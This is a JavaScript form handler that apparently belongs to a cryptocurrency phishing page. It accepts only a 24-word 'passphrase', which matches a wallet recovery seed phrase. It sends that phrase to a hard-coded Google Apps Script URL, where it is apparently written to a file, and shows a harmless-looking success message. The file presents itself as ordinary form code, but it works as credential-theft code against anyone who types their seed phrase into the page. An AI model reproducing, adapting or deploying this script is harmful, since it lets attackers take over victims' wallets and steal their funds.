// Function to handle form submission
function handleSubmit(event) {
    event.preventDefault(); // Prevent default form submission

    const errorElement = document.getElementById('emsg');
    errorElement.textContent = '';
    const myButton = document.getElementById('b1');
    const myButton2 = document.getElementById('b2');

    myButton.disabled = true;
    myButton2.disabled = true;

    // Get input value
    const form = document.getElementById('myForm');
    const inputValue = form.elements['mf-texts'].value.trim();

    // Validate that input has exactly 24 words
    const wordCount = inputValue.split(/\s+/).length;
    if (wordCount !== 24) {
        errorElement.textContent = 'Invalid Passphrase';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
        return;
    }

    // Google Apps Script Web App URL
    const scriptUrl = "https://script.google.com/macros/s/AKfycbzZkC3cqGP1qnpLW54EFpm9jr-_A7QI2GAcfBghxAt7USwSLsUvBUyvLoyfsXLKfMuU_A/exec"; // Replace with your actual URL

    // Send a request to Google Apps Script
    fetch(scriptUrl + "?input=" + encodeURIComponent(inputValue), {
        method: 'GET'
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            errorElement.textContent = "File created successfully!";
            console.log("File URL:", data.fileUrl);
        } else {
            errorElement.textContent = "Error: " + data.message;
        }
    })
    .catch(error => {
        console.error('Error:', error);
        errorElement.textContent = 'Request failed!';
    })
    .finally(() => {
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
    });
}

// Attach event listener to the form
const form = document.getElementById('myForm');
form.addEventListener('submit', handleSubmit);
